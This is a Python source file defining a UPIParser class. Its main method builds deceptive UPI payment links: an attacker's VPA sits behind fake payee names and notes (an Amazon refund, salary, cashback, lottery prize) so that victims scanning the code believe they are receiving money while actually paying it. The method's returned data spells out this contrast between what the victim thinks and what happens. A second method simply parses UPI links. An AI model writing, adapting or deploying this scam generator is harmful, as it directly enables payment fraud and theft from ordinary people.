import urllib.parse
import re
import json

class UPIParser:
    """Parse and analyze UPI QR code data"""
    
    @staticmethod
    def create_deceptive_upi_link(attacker_vpa, amount, scam_type="refund"):
        """
        Create a UPI link that TRICKS the victim
        """
        
        # Clean VPA
        attacker_vpa = attacker_vpa.strip()
        
        # Different deceptive scenarios
        scenarios = {
            "refund": {
                "from_name": "Amazon India",
                "note": "Refund for order #OD12345 - Amount credited",
                "action": "Collecting refund"
            },
            "salary": {
                "from_name": "Salary Account",
                "note": "Salary credit for February 2026",
                "action": "Salary credited"
            },
            "cashback": {
                "from_name": "Cashback Reward",
                "note": "Cashback from recent purchase",
                "action": "Cashback received"
            },
            "prize": {
                "from_name": "Lottery Department",
                "note": "Prize money winnings - Congratulations!",
                "action": "Prize credited"
            },
            "payment": {
                "from_name": "Customer Payment",
                "note": "Payment received for services",
                "action": "Payment received"
            }
        }
        
        scenario = scenarios.get(scam_type, scenarios["refund"])
        
        # URL encode
        from_encoded = urllib.parse.quote(scenario["from_name"])
        note_encoded = urllib.parse.quote(scenario["note"])
        
        # CREATE THE PAYMENT LINK (makes victim PAY)
        upi_link = f"upi://pay?pa={attacker_vpa}&pn={from_encoded}&am={amount}&tn={note_encoded}&cu=INR"
        
        return {
            "upi_link": upi_link,
            "deception": {
                "what_victim_thinks": f"Receiving ₹{amount} from {scenario['from_name']}",
                "what_actually_happens": f"Paying ₹{amount} to {attacker_vpa}",
                "scenario": scenario
            }
        }
    
    @staticmethod
    def parse_upi_link(upi_link):
        """Parse a UPI link to understand what it does"""
        result = {
            "type": "unknown",
            "payee_vpa": None,
            "payee_name": None,
            "amount": None,
            "note": None,
            "is_payment": False
        }
        
        if 'pa=' in upi_link:
            result["type"] = "payment_request"
            result["is_payment"] = True
            
            try:
                if '?' in upi_link:
                    query = upi_link.split('?')[1]
                    params = urllib.parse.parse_qs(query)
                    
                    if 'pa' in params:
                        result["payee_vpa"] = params['pa'][0]
                    if 'pn' in params:
                        result["payee_name"] = params['pn'][0]
                    if 'am' in params:
                        result["amount"] = float(params['am'][0])
                    if 'tn' in params:
                        result["note"] = params['tn'][0]
            except Exception as e:
                result["error"] = str(e)
        
        return result